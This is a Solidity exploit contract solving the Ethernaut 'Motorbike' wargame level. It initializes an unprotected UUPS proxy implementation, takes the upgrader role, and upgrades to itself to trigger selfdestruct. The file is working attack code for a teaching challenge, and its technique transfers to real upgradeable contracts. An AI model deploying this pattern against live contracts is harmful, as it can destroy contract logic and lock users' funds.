// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IMotorbike.sol";

/**
 * @title Motorbike Attack (Ethernaut Challenge Level 25 - Motorbike)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 25
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x58Ab506795EC0D3bFAE4448122afa4cDE51cfdd2
 */
contract MotorbikeAttack {
    bool private _levelPassed;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @dev To find address from storage, you can run this script in browser:
     * > '0x' + (await web3.eth.getStorageAt(contract.address, <IMPLEMENTATION_SLOT>)).slice(-40)
     * @param implementation Address of implementation contract
     */
    function attack(address implementation) external {
        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = implementation.call(abi.encodeWithSignature("initialize()"));

        require(isSuccess, "Motorbike: Call error");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess_, bytes memory data) = implementation.call(abi.encodeWithSignature("upgrader()"));

        require(isSuccess_, "Motorbike: Call error");

        require(address(this) == address(bytes20(bytes32(data) << (8 * 12))), "Motorbike: Wrong address");

        // solhint-disable-next-line avoid-low-level-calls
        (bool _isSuccess_, ) = implementation.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature("levelPassed()")
            )
        );

        require(_levelPassed = _isSuccess_, "Motorbike: Call error");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    function levelPassed() external {
        require(_levelPassed, "Motorbike: Level not passed yet");
        // solhint-disable-next-line avoid-tx-origin
        selfdestruct(payable(tx.origin));
    }
}
